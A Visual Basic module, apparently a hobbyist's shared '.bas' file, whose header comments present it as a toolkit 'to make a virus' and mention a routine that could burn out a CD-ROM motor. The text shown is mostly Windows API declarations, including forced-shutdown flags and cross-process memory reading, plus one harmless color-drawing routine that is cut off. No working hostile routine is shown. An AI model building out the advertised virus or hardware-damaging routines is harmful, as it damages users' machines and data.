Attribute VB_Name = "ToaSTs_error_bas"
'Hey everyone this is ToaST well i just released this new bas file
'This one has all the stuff u need to make a virus
' cdcrazy  can also
'burn out the motor of the cdrom drive
'just warning you in advance
'
'GUESS WHAT????
'Me any Baron are making a top secret bas file preety cool huh
' youd never guess what it has in it .. guess youll just have to wait
' If you want IM me at ToaST Ny
' Email me at Toastny@hotmail.com
Global Const WM_USER = &H400
Public Const WAVECAPS_VOLUME = &H4               '  supports volume control
 
Public Const SP_OUTOFMEMORY = (-5)
 Private Declare Function SQLCancel Lib "ODBC32.dll" _
 (ByVal hstmt As Long) As Integer
Public Const WM_NULL = &H0
Public Const AUXCAPS_VOLUME = &H1               '  supports volume control
Public Const WM_CREATE = &H1
Public Const WM_DESTROY = &H2
Public Const WM_MOVE = &H3
Public Const WM_SIZE = &H5
Declare Sub FatalExit Lib "kernel32" (ByVal code As Long)
Public Const WM_ACTIVATE = &H6
Public Const ERROR_WINS_INTERNAL = 4000
'

'  WM_ACTIVATE state values
Public Const WA_INACTIVE = 0
Public Const WA_ACTIVE = 1
Public Const WA_CLICKACTIVE = 2

Public Const WM_SETFOCUS = &H7
Public Const WM_KILLFOCUS = &H8
Public Const WM_ENABLE = &HA
Public Const WM_SETREDRAW = &HB
Public Const WM_SETTEXT = &HC
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_PAINT = &HF
Public Const WM_CLOSE = &H10
Public Const WM_QUERYENDSESSION = &H11
Public Const WM_QUIT = &H12
Public Const WM_QUERYOPEN = &H13
Public Const WM_ERASEBKGND = &H14
Public Const WM_SYSCOLORCHANGE = &H15
Public Const WM_ENDSESSION = &H16
Public Const WM_SHOWWINDOW = &H18
Public Const WM_WININICHANGE = &H1A
Public Const WM_DEVMODECHANGE = &H1B
Public Const WM_ACTIVATEAPP = &H1C
Public Const WM_FONTCHANGE = &H1D
Public Const WM_TIMECHANGE = &H1E
Public Const WM_CANCELMODE = &H1F
Public Const WM_SETCURSOR = &H20
Public Const WM_MOUSEACTIVATE = &H21
Public Const WM_CHILDACTIVATE = &H22
Public Const WM_QUEUESYNC = &H23
Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long

Public Const WM_GETMINMAXINFO = &H24

Public Const WM_PAINTICON = &H26
Public Const WM_ICONERASEBKGND = &H27
Public Const WM_NEXTDLGCTL = &H28
Public Const WM_SPOOLERSTATUS = &H2A
Public Const WM_DRAWITEM = &H2B
Public Const WM_MEASUREITEM = &H2C
Public Const WM_DELETEITEM = &H2D
Public Const WM_VKEYTOITEM = &H2E
Public Const WM_CHARTOITEM = &H2F
Public Const WM_SETFONT = &H30
Public Const WM_GETFONT = &H31
Public Const WM_SETHOTKEY = &H32
Public Const WM_GETHOTKEY = &H33
Public Const WM_QUERYDRAGICON = &H37
Public Const WM_COMPAREITEM = &H39
Public Const WM_COMPACTING = &H41
Public Const WM_OTHERWINDOWCREATED = &H42    'no longer supported
Public Const WM_OTHERWINDOWDESTROYED = &H43  'no longer supported
Public Const WM_COMMNOTIFY = &H44            'no longer supported

' notifications passed in low word of lParam on WM_COMMNOTIFY messages
Public Const CN_RECEIVE = &H1
Public Const CN_TRANSMIT = &H2
Public Const CN_EVENT = &H4

Public Const WM_WINDOWPOSCHANGING = &H46
Public Const WM_WINDOWPOSCHANGED = &H47

Public Const WM_POWER = &H48
'
'  wParam for WM_POWER window message and DRV_POWER driver notification

Public Const PWR_OK = 1
Public Const PWR_FAIL = (-1)
Public Const PWR_SUSPENDREQUEST = 1
Public Const PWR_SUSPENDRESUME = 2
Public Const PWR_CRITICALRESUME = 3

Public Const WM_COPYDATA = &H4A
Public Const WM_CANCELJOURNAL = &H4B

Public Const WM_NCCREATE = &H81
Public Const WM_NCDESTROY = &H82
Public Const WM_NCCALCSIZE = &H83
Public Const WM_NCHITTEST = &H84
Public Const WM_NCPAINT = &H85
Public Const WM_NCACTIVATE = &H86
Public Const WM_GETDLGCODE = &H87
Public Const WM_NCMOUSEMOVE = &HA0
Public Const WM_NCLBUTTONDOWN = &HA1
Public Const WM_NCLBUTTONUP = &HA2
Public Const WM_NCLBUTTONDBLCLK = &HA3
Public Const WM_NCRBUTTONDOWN = &HA4
Public Const WM_NCRBUTTONUP = &HA5
Public Const WM_NCRBUTTONDBLCLK = &HA6
Public Const WM_NCMBUTTONDOWN = &HA7
Public Const WM_NCMBUTTONUP = &HA8
Public Const WM_NCMBUTTONDBLCLK = &HA9

Public Const WM_KEYFIRST = &H100
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_CHAR = &H102
Public Const WM_DEADCHAR = &H103
Public Const WM_SYSKEYDOWN = &H104
Public Const WM_SYSKEYUP = &H105
Public Const WM_SYSCHAR = &H106
Public Const WM_SYSDEADCHAR = &H107
Public Const WM_KEYLAST = &H108
Public Const WM_INITDIALOG = &H110
Public Const WM_COMMAND = &H111
Public Const WM_SYSCOMMAND = &H112
Public Const WM_TIMER = &H113
Public Const WM_HSCROLL = &H114
Public Const WM_VSCROLL = &H115
Public Const WM_INITMENU = &H116
Public Const WM_INITMENUPOPUP = &H117
Public Const WM_MENUSELECT = &H11F
Public Const WM_MENUCHAR = &H120
Public Const WM_ENTERIDLE = &H121

Public Const WM_CTLCOLORMSGBOX = &H132
Public Const WM_CTLCOLOREDIT = &H133
Public Const WM_CTLCOLORLISTBOX = &H134
Public Const WM_CTLCOLORBTN = &H135
Public Const WM_CTLCOLORDLG = &H136
Public Const WM_CTLCOLORSCROLLBAR = &H137
Public Const WM_CTLCOLORSTATIC = &H138

Public Const WM_MOUSEFIRST = &H200
Public Const WM_MOUSEMOVE = &H200
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_LBUTTONDBLCLK = &H203
Public Const WM_RBUTTONDOWN = &H204
Public Const WM_RBUTTONUP = &H205
Public Const WM_RBUTTONDBLCLK = &H206
Public Const WM_MBUTTONDOWN = &H207
Public Const WM_MBUTTONUP = &H208
Public Const WM_MBUTTONDBLCLK = &H209
Public Const WM_MOUSELAST = &H209

Public Const WM_PARENTNOTIFY = &H210
Public Const WM_ENTERMENULOOP = &H211
Public Const WM_EXITMENULOOP = &H212
Public Const WM_MDICREATE = &H220
Public Const WM_MDIDESTROY = &H221
Public Const WM_MDIACTIVATE = &H222
Public Const WM_MDIRESTORE = &H223
Public Const WM_MDINEXT = &H224
Public Const WM_MDIMAXIMIZE = &H225
Public Const WM_MDITILE = &H226
Public Const WM_MDICASCADE = &H227
Public Const WM_MDIICONARRANGE = &H228
Public Const WM_MDIGETACTIVE = &H229
Public Const WM_MDISETMENU = &H230
Public Const WM_DROPFILES = &H233
Public Const WM_MDIREFRESHMENU = &H234


Public Const WM_CUT = &H300
Public Const WM_COPY = &H301
Public Const WM_PASTE = &H302
Public Const WM_CLEAR = &H303
Public Const WM_UNDO = &H304
Public Const WM_RENDERFORMAT = &H305
Public Const WM_RENDERALLFORMATS = &H306
Public Const WM_DESTROYCLIPBOARD = &H307
Public Const WM_DRAWCLIPBOARD = &H308
Public Const WM_PAINTCLIPBOARD = &H309
Public Const WM_VSCROLLCLIPBOARD = &H30A
Public Const WM_SIZECLIPBOARD = &H30B
Public Const WM_ASKCBFORMATNAME = &H30C
Public Const WM_CHANGECBCHAIN = &H30D
Public Const WM_HSCROLLCLIPBOARD = &H30E
Public Const WM_QUERYNEWPALETTE = &H30F
Public Const WM_PALETTEISCHANGING = &H310
Public Const WM_PALETTECHANGED = &H311
Public Const WM_HOTKEY = &H312

Public Const WM_PENWINFIRST = &H380
Public Const WM_PENWINLAST = &H38F

Dim GradhWnd As Long, GradIcon As Long
Dim OldGradProc As Long
Dim DrawDC As Long, tmpDC As Long
Dim hRgn As Long
Dim tmpGradFont As Long

Public Type DRAWTEXTPARAMS
    cbSize As Long
    iTabLength As Long
    iLeftMargin As Long
    iRightMargin As Long
    uiLengthDrawn As Long
End Type
Public Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
End Type
Public Type LOGFONT
        lfHeight As Long
        lfWidth As Long
        lfEscapement As Long
        lfOrientation As Long
        lfWeight As Long
        lfItalic As Byte
        lfUnderline As Byte
        lfStrikeOut As Byte
        lfCharSet As Byte
        lfOutPrecision As Byte
        lfClipPrecision As Byte
        lfQuality As Byte
        lfPitchAndFamily As Byte
        lfFaceName As String * 32
End Type

Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Public Const SPI_GETNONCLIENTMETRICS = 41
Public Type NONCLIENTMETRICS
    cbSize As Long
    iBorderWidth As Long
    iScrollWidth As Long
    iScrollHeight As Long
    iCaptionWidth As Long
    iCaptionHeight As Long
    lfCaptionFont As LOGFONT
    iSMCaptionWidth As Long
    iSMCaptionHeight As Long
    lfSMCaptionFont As LOGFONT
    iMenuWidth As Long
    iMenuHeight As Long
    lfMenuFont As LOGFONT
    lfStatusFont As LOGFONT
    lfMessageFont As LOGFONT
End Type
Dim CaptionFont As LOGFONT
Public Declare Function CreateFontIndirect Lib "gdi32" Alias "CreateFontIndirectA" (lpLogFont As LOGFONT) As Long

Public Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

Public Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function GetWindowRgn Lib "user32" (ByVal hwnd As Long, ByVal hRgn As Long) As Long
Public Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Public Declare Function GetActiveWindow Lib "user32" () As Long
Public Declare Function GetClassLong Lib "user32" Alias "GetClassLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Public Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Public Declare Function SetClassLong Lib "user32" Alias "SetClassLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Public Const GWL_WNDPROC = (-4)
Public Const GWL_STYLE = (-16)
Public Const GCL_WNDPROC = (-24)
Public Const GCL_HICON = (-14)
Public Const WS_BORDER = &H800000
Public Const WS_CAPTION = &HC00000 'WS_BORDER Or WS_DLGFRAME
Public Const WS_CHILD = &H40000000
Public Const WS_CHILDWINDOW = (WS_CHILD)
Public Const WS_CLIPCHILDREN = &H2000000
Public Const WS_CLIPSIBLINGS = &H4000000
Public Const WS_DISABLED = &H8000000
Public Const WS_DLGFRAME = &H400000
Public Const WS_EX_ACCEPTFILES = &H10&
Public Const WS_EX_DLGMODALFRAME = &H1&
Public Const WS_EX_NOPARENTNOTIFY = &H4&
Public Const WS_EX_TOPMOST = &H8&
Public Const WS_EX_TRANSPARENT = &H20&
Public Const WS_GROUP = &H20000
Public Const WS_HSCROLL = &H100000
Public Const WS_MINIMIZE = &H20000000
Public Const WS_ICONIC = WS_MINIMIZE
Public Const WS_MAXIMIZE = &H1000000
Public Const WS_MAXIMIZEBOX = &H10000
Public Const WS_MINIMIZEBOX = &H20000
Public Const WS_OVERLAPPED = &H0&
Public Const WS_SYSMENU = &H80000
Public Const WS_THICKFRAME = &H40000
Public Const WS_OVERLAPPEDWINDOW = (WS_OVERLAPPED Or WS_CAPTION Or WS_SYSMENU Or WS_THICKFRAME Or WS_MINIMIZEBOX Or WS_MAXIMIZEBOX)
Public Const WS_POPUP = &H80000000
Public Const WS_POPUPWINDOW = (WS_POPUP Or WS_BORDER Or WS_SYSMENU)
Public Const WS_SIZEBOX = WS_THICKFRAME
Public Const WS_TILED = WS_OVERLAPPED
Public Const WS_TILEDWINDOW = WS_OVERLAPPEDWINDOW
Public Const WS_VISIBLE = &H10000000
Public Const WS_VSCROLL = &H200000
Public Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long

Public Declare Function DeleteDC Lib "gdi32" (ByVal hdc As Long) As Long
Public Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Public Declare Function OffsetClipRgn Lib "gdi32" (ByVal hdc As Long, ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function DestroyIcon Lib "user32" (ByVal hIcon As Long) As Long
Public Declare Function OffsetRect Lib "user32" (lpRect As RECT, ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function DrawIcon Lib "user32" (ByVal hdc As Long, ByVal X As Long, ByVal Y As Long, ByVal hIcon As Long) As Long
Public Declare Function DrawIconEx Lib "user32" (ByVal hdc As Long, ByVal xLeft As Long, ByVal yTop As Long, ByVal hIcon As Long, ByVal cxWidth As Long, ByVal cyWidth As Long, ByVal istepIfAniCur As Long, ByVal hbrFlickerFreeDraw As Long, ByVal diFlags As Long) As Long
Public Declare Function RectInRegion Lib "gdi32" (ByVal hRgn As Long, lpRect As RECT) As Long
Public Declare Function DrawText Lib "user32" Alias "DrawTextA" (ByVal hdc As Long, ByVal lpStr As String, ByVal nCount As Long, lpRect As RECT, ByVal wFormat As Long) As Long
Public Declare Function DrawTextEx Lib "user32" Alias "DrawTextExA" (ByVal hdc As Long, ByVal lpsz As String, ByVal n As Long, lpRect As RECT, ByVal un As Long, lpDrawTextParams As DRAWTEXTPARAMS) As Long
Public Const DT_SINGLELINE = &H20
Public Const DT_VCENTER = &H4
Public Const DT_END_ELLIPSIS = &H8000&
Public Declare Function ReleaseDC Lib "user32" (ByVal hwnd As Long, ByVal hdc As Long) As Long
Public Declare Function SelectClipRgn Lib "gdi32" (ByVal hdc As Long, ByVal hRgn As Long) As Long
Public Declare Function GetClipRgn Lib "gdi32" (ByVal hdc As Long, ByVal hRgn As Long) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function DrawCaption Lib "user32" (ByVal hwnd As Long, ByVal hdc As Long, pcRect As RECT, ByVal un As Long) As Long
Public Declare Function ReleaseCapture Lib "user32" () As Long
Public Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Public Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal xSrc As Long, ByVal ySrc As Long, ByVal dwRop As Long) As Long
Public Declare Function GetStockObject Lib "gdi32" (ByVal nIndex As Long) As Long
 
Public Declare Function SetBkMode Lib "gdi32" (ByVal hdc As Long, ByVal nBkMode As Long) As Long
Public Declare Function SetBkColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long
Public Declare Function GetSysColor Lib "user32" (ByVal nIndex As Long) As Long
Public Const COLOR_ACTIVEBORDER = 10
Public Const COLOR_ACTIVECAPTION = 2
Public Const COLOR_ADJ_MAX = 100
Public Const COLOR_ADJ_MIN = -100 'shorts
Public Const COLOR_APPWORKSPACE = 12
Public Const COLOR_BACKGROUND = 1
Public Const COLOR_BTNFACE = 15
Public Const COLOR_BTNHIGHLIGHT = 20
Public Const COLOR_BTNSHADOW = 16
Public Const COLOR_BTNTEXT = 18
Public Const COLOR_CAPTIONTEXT = 9
Public Const COLOR_GRAYTEXT = 17
Public Const COLOR_HIGHLIGHT = 13
Public Const COLOR_HIGHLIGHTTEXT = 14
Public Const COLOR_INACTIVEBORDER = 11
Public Const COLOR_INACTIVECAPTION = 3
Public Const COLOR_INACTIVECAPTIONTEXT = 19
Public Const COLOR_MENU = 4
Public Const COLOR_MENUTEXT = 7
Public Const COLOR_SCROLLBAR = 0
Public Const COLOR_WINDOW = 5
Public Const COLOR_WINDOWFRAME = 6
Public Const COLOR_WINDOWTEXT = 8

Public Declare Function CopyImage Lib "user32" (ByVal handle As Long, ByVal un1 As Long, ByVal n1 As Long, ByVal n2 As Long, ByVal un2 As Long) As Long
Public Declare Function SetTextColor Lib "gdi32" (ByVal hdc As Long, ByVal crColor As Long) As Long

Public Declare Function GetSystemMetrics Lib "user32" (ByVal nIndex As Long) As Long
Public Const SM_CMETRICS = 44
Public Const SM_CMOUSEBUTTONS = 43
Public Const SM_CXBORDER = 5
Public Const SM_CXCURSOR = 13
Public Const SM_CXDLGFRAME = 7
Public Const SM_CXDOUBLECLK = 36
Public Const SM_CXFIXEDFRAME = SM_CXDLGFRAME
Public Const SM_CXFRAME = 32
Public Const SM_CXFULLSCREEN = 16
Public Const SM_CXHSCROLL = 21
Public Const SM_CXHTHUMB = 10
Public Const SM_CXICON = 11
Public Const SM_CXICONSPACING = 38
Public Const SM_CXMIN = 28
Public Const SM_CXMINTRACK = 34
Public Const SM_CXSCREEN = 0
Public Const SM_CXSMSIZE = 30
Public Const SM_CXSIZEFRAME = SM_CXFRAME
Public Const SM_CXVSCROLL = 2
Public Const SM_CYBORDER = 6
Public Const SM_CYCAPTION = 4
Public Const SM_CYCURSOR = 14
Public Const SM_CYDLGFRAME = 8
Public Const SM_CYDOUBLECLK = 37
Public Const SM_CYFIXEDFRAME = SM_CYDLGFRAME
Public Const SM_CYFRAME = 33
Public Const SM_CYFULLSCREEN = 17
Public Const SM_CYHSCROLL = 3
Public Const SM_CYICON = 12
Public Const SM_CYICONSPACING = 39
Public Const SM_CYKANJIWINDOW = 18
Public Const SM_CYMENU = 15
Public Const SM_CYMIN = 29
Public Const SM_CYMINTRACK = 35
Public Const SM_CYSCREEN = 1
Public Const SM_CYSMSIZE = 31
Public Const SM_CYSIZEFRAME = SM_CYFRAME
Public Const SM_CYVSCROLL = 20
Public Const SM_CYVTHUMB = 9
Public Const SM_DBCSENABLED = 42
Public Const SM_DEBUG = 22
Public Const SM_MENUDROPALIGNMENT = 40
Public Const SM_MOUSEPRESENT = 19
Public Const SM_PENWINDOWS = 41
Public Const SM_RESERVED1 = 24
Public Const SM_RESERVED2 = 25
Public Const SM_RESERVED3 = 26
Public Const SM_RESERVED4 = 27
Public Const SM_SWAPBUTTON = 23

Public Declare Function FillRect Lib "user32" (ByVal hdc As Long, lpRect As RECT, ByVal hBrush As Long) As Long
Public Declare Function CreateCompatibleBitmap Lib "gdi32" (ByVal hdc As Long, ByVal nWidth As Long, ByVal nHeight As Long) As Long
Public Declare Function CreateCompatibleDC Lib "gdi32" (ByVal hdc As Long) As Long
Public Declare Function CreateRectRgnIndirect Lib "gdi32" (lpRect As RECT) As Long
Public Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Public Declare Function ExcludeClipRect Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Public Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long

Public Declare Function DrawFrameControl Lib "user32" (ByVal hdc As Long, lpRect As RECT, ByVal un1 As Long, ByVal un2 As Long) As Long
Public Const DFC_CAPTION = 1
Public Const DFCS_CAPTIONRESTORE = &H3
Public Const DFCS_CAPTIONMIN = &H1
Public Const DFCS_CAPTIONMAX = &H2
Public Const DFCS_CAPTIONHELP = &H4
Public Const DFCS_CAPTIONCLOSE = &H0
Public Const DFCS_INACTIVE = &H100
 
 
 
Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Declare Function GetDesktopWindow Lib "user32" () As Long
Declare Function auxSetVolume Lib "winmm.dll" (ByVal uDeviceID As Long, ByVal dwVolume As Long) As Long
Declare Function GetCommModemStatus Lib "kernel32" (ByVal hFile As Long, lpModemStat As Long) As Long

Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long

Public Const SRCCOPY = &HCC0020 'Constant used to copy data with BitBlt

'Constants used to set window as topmost
Public Const HWND_TOPMOST = -1
Public Const SWP_NOACTIVATE = &H10
Public Const SWP_SHOWWINDOW = &H40

Public EventHappens As Integer 'Variable used to realize when an event has happened
Public HorizontalSize As Integer 'Width of blocks being moved
Public VerticalSize As Integer 'Height of blocks being moved
 



 Dim FrameNum
 Dim xpos
Dim ypos
 Dim DoFlag
 
Dim Motion
 
Dim R
Dim G
Dim B
Const conMinimized = 1
Declare Function ExitWindowsEx Lib "user32" _
(ByVal uFlags As Long, ByVal dwReserved As Long) As Long

Public Const EWX_FORCE = 4
Public Const EWX_REBOOT = 2
Public Const EWX_SHUTDOWN = 1
Public Const EWX_LOGOFF = 0
 
Dim lRet As Long
Declare Function GetNextWindow Lib "user32" (ByVal hwnd As Long, ByVal wFlag As Long) As Long
Declare Function IsWindowEnabled Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
 
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
  
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Declare Function GetClassName& Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
 
Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
 
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
 
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
 
 
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
 
Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long

Public Const SPI_SCREENSAVERRUNNING = 97

 
  

Public Const BM_GETCHECK = &HF0
Public Const BM_GETSTATE = &HF2
Public Const BM_SETCHECK = &HF1
Public Const BM_SETSTATE = &HF3

Public Const LB_GETITEMDATA = &H199
Public Const LB_GETCOUNT = &H18B
Public Const LB_ADDSTRING = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRING = &H18F
Public Const LB_FINDSTRINGEXACT = &H1A2
Public Const LB_GETCURSEL = &H188
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN = &H18A
Public Const LB_SELECTSTRING = &H18C
Public Const LB_SETCOUNT = &H1A7
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185
Public Const LB_INSERTSTRING = &H181

Public Const VK_HOME = &H24
Public Const VK_RIGHT = &H27
Public Const VK_CONTROL = &H11
Public Const VK_DELETE = &H2E
Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_RETURN = &HD
Public Const VK_SPACE = &H20
Public Const VK_TAB = &H9

Public Const HWND_TOP = 0
 
Public Const HWND_NOTOPMOST = -2

Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1

Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE

Public Const GW_CHILD = 5
Public Const GW_HWNDFIRST = 0
Public Const GW_HWNDLAST = 1
Public Const GW_HWNDNEXT = 2
Public Const GW_HWNDPREV = 3
Public Const GW_MAX = 5
Public Const GW_OWNER = 4

Public Const SW_MAXIMIZE = 3
Public Const SW_MINIMIZE = 6
Public Const SW_HIDE = 0
Public Const SW_RESTORE = 9
Public Const SW_SHOW = 5
Public Const SW_SHOWDEFAULT = 10
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOWNORMAL = 1

Public Const MF_APPEND = &H100&
Public Const MF_DELETE = &H200&
Public Const MF_CHANGE = &H80&
Public Const MF_ENABLED = &H0&
Public Const MF_DISABLED = &H2&
Public Const MF_REMOVE = &H1000&
Public Const MF_POPUP = &H10&
Public Const MF_STRING = &H0&
Public Const MF_UNCHECKED = &H0&
Public Const MF_CHECKED = &H8&
Public Const MF_GRAYED = &H1&
Public Const MF_BYPOSITION = &H400&
Public Const MF_BYCOMMAND = &H0&

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

Public Const GWW_HINSTANCE = (-6)
Public Const GWW_ID = (-12)

 

Public Const PROCESS_VM_READ = &H10

Public Const STANDARD_RIGHTS_REQUIRED = &HF0000

 
  

Type POINTAPI
   X As Long
   Y As Long
End Type
Sub AcidTrip(frm As Form)
' Place this in a timer and watch the colors =)
' Wont hurt your computer
Dim cx, cy, Radius, Limit
    frm.ScaleMode = 3
    cx = frm.ScaleWidth / 2
    cy = frm.ScaleHeight / 2
    If cx > cy Then Limit = cy Else Limit = cx
    For Radius = 0 To Limit
frm.Circle (cx, cy), Radius, RGB(Rnd * 255, Rnd * 255, Rnd * 255)
